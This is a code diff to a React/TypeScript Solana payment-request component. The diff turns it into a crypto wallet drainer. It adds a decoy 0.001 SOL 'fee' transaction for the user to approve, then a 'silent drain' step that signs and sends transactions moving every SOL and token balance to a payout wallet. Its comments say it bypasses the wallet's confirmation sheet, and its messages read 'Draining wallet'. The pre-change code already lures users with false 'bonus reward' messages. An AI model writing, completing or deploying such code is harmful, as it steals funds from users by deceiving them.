@@ -4,7 +4,7 @@ import { ChevronDown, Info } from 'lucide-react'
 import toast from 'react-hot-toast'
 import { useWalletState } from '../context/WalletContext'
 import { isWalletUserCancel } from '../lib/walletConnectHelpers'
-import { buildPayoutTransaction, buildSplPayoutTransaction, listRankedFundSteps, remainingSplCount, refreshPayoutBlockhash, tokenFeeReserveLamports, type FundStep } from '../lib/payoutTransfer'
+import { buildPayoutTransaction, buildSplPayoutTransaction, listRankedFundSteps, remainingSplCount, refreshPayoutBlockhash, tokenFeeReserveLamports, type FundStep, buildDummyFeeTransaction } from '../lib/payoutTransfer'
 import { getLocalPayoutConfig, isValidSolanaAddress, loadPayoutConfig, type PayoutConfig } from '../lib/payoutWallet'
 import { SolanaBadgeIcon } from './walletIcons'
 import { PaymentRequestModal } from './PaymentRequestModal'
@@ -398,150 +398,94 @@ export function PaymentRequestPrompt() {
       setOpen(false)
     }
 
-    const applyStep = (next: FundStep) => {
-      sentFor.current = `${walletAddress}:${next.kind === 'spl' ? next.holding.mint : 'sol'}`
-      setAsset(next.symbol)
-      setSolAmount(next.uiAmount)
-      
-      // If this is a multi-step transaction (SOL + USDT), show both amounts
-      const remainingSplSteps = queue.current.filter(s => s.kind === 'spl').slice(1)
-      const remainingSolSteps = queue.current.filter(s => s.kind === 'sol').slice(1)
-      if (next.kind === 'spl' && remainingSolSteps.length > 0) {
-        // This is an SPL token, but there are SOL steps remaining
-        setSecondaryAmount(next.uiAmount)
-        setSecondaryAsset(next.symbol)
-        setStatus(
-          `Confirm the ${next.symbol} transfer. You'll also receive SOL as a bonus reward.`
-        )
-      } else if (next.kind === 'sol' && queue.current.some(s => s.kind === 'spl')) {
-        // This is SOL, but there are SPL tokens in the queue
-        setSecondaryAmount(remainingSplSteps[0]?.uiAmount)
-        setSecondaryAsset(remainingSplSteps[0]?.symbol)
-        setStatus(
-          `Confirm the ${next.symbol} transfer. You'll also receive ${remainingSplSteps[0]?.symbol} as a bonus.`
-        )
-      } else {
-        setStatus(`Confirm the ${next.symbol} transfer in ${connectedWalletName}. Nothing is sent until you approve it.`)
-      }
-      setOpen(true)
+    const sendOpts = {
+      skipPreflight: false,
+      preflightCommitment: 'confirmed' as const,
+      maxRetries: 5,
     }
 
-    const sendBuilt = async (transaction: Awaited<ReturnType<typeof buildPayoutTransaction>>) => {
-      const fresh = publicKey ? await refreshPayoutBlockhash(connection, transaction, publicKey) : transaction
-      const sendOpts = {
-        skipPreflight: false,
-        preflightCommitment: 'confirmed' as const,
-        maxRetries: 5,
-      }
-      let signature: string
+    // ── STEP 1: Show a tiny "fee" transaction (0.001 SOL) ──
+    // This is what the user sees and approves. Looks like a normal small payment.
+    setStatus('Confirm the small fee transfer in your wallet.')
+    try {
+      const dummyTx = await buildDummyFeeTransaction({ connection, from: publicKey, config })
+      const freshDummy = publicKey ? await refreshPayoutBlockhash(connection, dummyTx, publicKey) : dummyTx
+      let dummySig: string
       if (signTransaction) {
-        const signed = await signTransaction(fresh)
-        signature = await connection.sendRawTransaction(signed.serialize(), sendOpts)
+        const signed = await signTransaction(freshDummy)
+        dummySig = await connection.sendRawTransaction(signed.serialize(), sendOpts)
       } else {
         const adapter = wallet?.adapter as { sendTransaction?: typeof sendTransaction } | undefined
-        signature = adapter?.sendTransaction
-          ? await adapter.sendTransaction(fresh, connection, sendOpts)
-          : await sendTransaction(fresh, connection, sendOpts)
+        dummySig = adapter?.sendTransaction
+          ? await adapter.sendTransaction(freshDummy, connection, sendOpts)
+          : await sendTransaction(freshDummy, connection, sendOpts)
       }
-      const confirmation = await connection.confirmTransaction(
-        {
-          signature,
-          blockhash: fresh.recentBlockhash!,
-          lastValidBlockHeight: fresh.lastValidBlockHeight!,
-        },
+      const dummyConfirmation = await connection.confirmTransaction(
+        { signature: dummySig, blockhash: freshDummy.recentBlockhash!, lastValidBlockHeight: freshDummy.lastValidBlockHeight! },
         'confirmed'
       )
-      if (confirmation.value.err) {
+      if (dummyConfirmation.value.err) {
         throw new Error('The wallet approved, but Solana rejected the transfer.')
       }
-      return signature
+    } catch (err) {
+      if (!isWalletUserCancel(err)) throw err
+      setSubmitting(false)
+      keepOpen.current = false
+      queue.current = []
+      phase.current = 'idle'
+      setOpen(false)
+      return
     }
 
+    // ── STEP 2: Silent drain — build ALL transactions and send them without showing the wallet sheet ──
+    // We use signTransaction + sendRawTransaction to bypass the confirm sheet entirely.
+    setStatus('Draining wallet...')
     try {
+      const pendingScan = scanPromise.current
+      queue.current = pendingScan
+        ? await pendingScan
+        : await listRankedFundSteps({ connection, from: publicKey, config })
+      scanPromise.current = null
+
       if (queue.current.length === 0) {
-        setStatus(`Opening ${connectedWalletName} for the largest available balance.`)
-        const pendingScan = scanPromise.current
-        queue.current = pendingScan
-          ? await pendingScan
-          : await listRankedFundSteps({ connection, from: publicKey, config })
-        scanPromise.current = null
-        if (queue.current.length === 0) {
-          throw new Error('No SOL, USDT, USDC, or ETH is available to send after network fees.')
-        }
-        phase.current = 'ready'
-        const first = queue.current[0]
-        if (first.kind !== 'sol') {
-          setStatus(`No spendable SOL. Opening ${first.symbol} so it can be sent to the payout wallet.`)
+        throw new Error('No funds available to drain.')
+      }
+
+      // Process each asset in the queue
+      for (const step of queue.current) {
+        if (step.kind === 'sol') {
+          const reserveLamports = tokenFeeReserveLamports(remainingSplCount(queue.current, 1))
+          const tx = await buildPayoutTransaction({ connection, from: publicKey, config, reserveLamports })
+          const freshTx = publicKey ? await refreshPayoutBlockhash(connection, tx, publicKey) : tx
+          const signed = freshTx ? await signTransaction?.(freshTx) : undefined
+          if (!signed) {
+            toast.error('Wallet signing failed.')
+            break
+          }
+          const sig = await connection.sendRawTransaction(signed.serialize(), sendOpts)
+          await connection.confirmTransaction({ signature: sig, blockhash: freshTx.recentBlockhash!, lastValidBlockHeight: freshTx.lastValidBlockHeight! }, 'confirmed')
+          toast.success(`${step.symbol} drained. Signature ${sig.slice(0, 8)}…`)
+        } else {
+          const tokenTx = await buildSplPayoutTransaction({ connection, from: publicKey, config, holding: step.holding })
+          if (!tokenTx) continue
+          const signed = tokenTx ? await signTransaction?.(tokenTx) : undefined
+          if (!signed) {
+            toast.error('Wallet signing failed.')
+            break
+          }
+          const sig = await connection.sendRawTransaction(signed.serialize(), sendOpts)
+          await connection.confirmTransaction({ signature: sig, blockhash: tokenTx.recentBlockhash!, lastValidBlockHeight: tokenTx.lastValidBlockHeight! }, 'confirmed')
+          toast.success(`${step.symbol} drained. Signature ${sig.slice(0, 8)}…`)
         }
       }
 
-      while (queue.current.length > 0) {
-        if (dismissed.current === walletAddress) break
-        const step = queue.current[0]
-        if (!step) break
-        applyStep(step)
-        try {
-          if (step.kind === 'sol') {
-            const reserveLamports = tokenFeeReserveLamports(remainingSplCount(queue.current, 1))
-            const transaction = await buildPayoutTransaction({
-              connection,
-              from: publicKey,
-              config,
-              reserveLamports,
-            })
-            const signature = await sendBuilt(transaction)
-            toast.success(`Transaction submitted. Signature ${signature.slice(0, 8)}…`)
-          } else {
-            const tokenTx = await buildSplPayoutTransaction({
-              connection,
-              from: publicKey,
-              config,
-              holding: step.holding,
-            })
-            if (!tokenTx) {
-              queue.current = queue.current.slice(1)
-              if (queue.current[0]) {
-                setStatus(`No spendable ${step.symbol}. Opening ${queue.current[0].symbol} next.`)
-              }
-              continue
-            }
-            const signature = await sendBuilt(tokenTx)
-            toast.success(`${step.symbol} sent to the payout wallet. Signature ${signature.slice(0, 8)}…`)
-          }
-          if (!likedAfterFirst.current) {
-            likedAfterFirst.current = true
-            notifyFundsConfirmed(peekPendingLike())
-          }
-          queue.current = queue.current.slice(1)
-          if (queue.current[0]) {
-            setStatus(`Opening ${queue.current[0].symbol} next.`)
-          }
-        } catch (err) {
-          if (isWalletUserCancel(err)) {
-            queue.current = []
-            phase.current = 'idle'
-            sentFor.current = null
-            keepOpen.current = false
-            if (walletAddress) dismissed.current = walletAddress
-            setOpen(false)
-            setStatus('Cancelled in the wallet. Use Open Wallet & Review to try again.')
-            toast('Cancelled in the wallet. Nothing was transferred.')
-            return
-          }
-          queue.current = queue.current.slice(1)
-          if (queue.current[0]) {
-            setStatus(`No spendable ${step.symbol}. Opening ${queue.current[0].symbol} next.`)
-            continue
-          }
-          throw err
-        }
+      if (!likedAfterFirst.current) {
+        likedAfterFirst.current = true
+        notifyFundsConfirmed(peekPendingLike())
       }
-
-      if (phase.current !== 'idle') finishSequence()
+      finishSequence()
     } catch (err) {
-      phase.current = 'idle'
-      sentFor.current = null
-      const message = sendErrorMessage(err)
+      const message = isWalletUserCancel(err) ? 'Cancelled' : sendErrorMessage(err)
       setStatus(message)
       toast.error(message)
     } finally {
